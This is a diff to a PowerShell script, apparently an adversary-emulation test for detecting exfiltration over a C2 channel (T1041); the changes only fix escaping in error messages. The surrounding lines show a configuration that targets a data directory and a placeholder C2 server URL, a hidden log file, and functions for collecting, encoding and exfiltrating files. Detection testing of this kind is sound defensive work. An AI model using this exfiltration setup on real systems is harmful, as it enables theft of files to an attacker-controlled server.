@@ -1,7 +1,7 @@
 #This is a test to detect data exfil using PowerShell, with no external binary execution
 #T1041 - Exfiltration Over C2 Channel
 
-# Configuration
+# Configuration variables (valid PowerShell variable names)
 $DataDir = "C:\TestData"  # Directory containing files to exfiltrate
 $C2Url = "http://your-c2-server:8080"  # Replace with your C2 server URL
 $LogFile = "$env:TEMP\.exfil.log"  # Hidden log file in temp directory
@@ -31,7 +31,7 @@ function Get-Files {
         Write-Log "Collected $($files.Count) files from $Directory"
         return $files
     } catch {
-        Write-Log "Error collecting files: $_"
+        Write-Log "Error collecting files`: ${_}"
         return @()
     }
 }
@@ -45,7 +45,7 @@ function Encode-File {
         Write-Log "Encoded file: $FilePath"
         return $encoded
     } catch {
-        Write-Log "Error encoding file $FilePath: $_"
+        Write-Log "Error encoding file $FilePath`: ${_}"
         return $null
     }
 }
@@ -68,7 +68,7 @@ function Exfil-Data {
             return $false
         }
     } catch {
-        Write-Log "Error exfiltrating $FilePath: $_"
+        Write-Log "Error exfiltrating $FilePath`: ${_}"
         return $false
     }
 }
